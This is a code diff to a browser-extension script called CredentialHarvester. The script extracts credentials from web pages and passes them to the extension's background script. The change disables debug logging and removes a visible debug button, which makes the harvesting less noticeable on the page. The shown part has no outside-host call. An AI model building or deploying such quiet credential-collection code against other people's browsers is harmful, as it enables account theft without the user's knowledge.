@@ -10,7 +10,7 @@ class CredentialHarvester {
     }
     this.lastExtraction = 0
     this.extractionCooldown = 2000 // 2 seconds cooldown between extractions
-    this.debugMode = true // Enable debug mode
+    this.debugMode = false // Disable debug mode
   }
 
   log(...args) {
@@ -272,7 +272,7 @@ class CredentialHarvester {
         this.log("✅ Credentials found:", this.credentials)
 
         // Send message to background script
-        if (typeof chrome !== "undefined" && chrome.runtime) {
+        if (typeof chrome !== "undefined" && typeof chrome.runtime !== "undefined") {
           chrome.runtime.sendMessage({
             action: "credentialsFound",
             credentials: this.credentials,
@@ -449,43 +449,11 @@ class CredentialHarvester {
     })
   }
 
-  // Add a debug button to manually trigger extraction
-  addDebugButton() {
-    const button = document.createElement("button")
-    button.textContent = "🔍 Extract Credentials (Debug)"
-    button.style.cssText = `
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      padding: 10px 15px;
-      background: #4caf50;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-weight: bold;
-      z-index: 999999;
-      cursor: pointer;
-    `
-
-    button.addEventListener("click", () => {
-      this.log("🔄 Manual extraction triggered via debug button")
-      this.extractCredentials(true)
-    })
-
-    document.body.appendChild(button)
-    this.log("🔧 Debug button added")
-  }
-
   start() {
     this.log("🚀 Starting credential harvester...")
     this.setupMutationObserver()
     this.setupCustomEventListener()
     this.extractCredentials() // Initial check in case credentials are already present
-
-    // Add debug button after 2 seconds
-    setTimeout(() => {
-      this.addDebugButton()
-    }, 2000)
 
     // Expose manual extraction function to window for direct access
     window.manuallyExtractCredentials = () => this.extractCredentials(true)
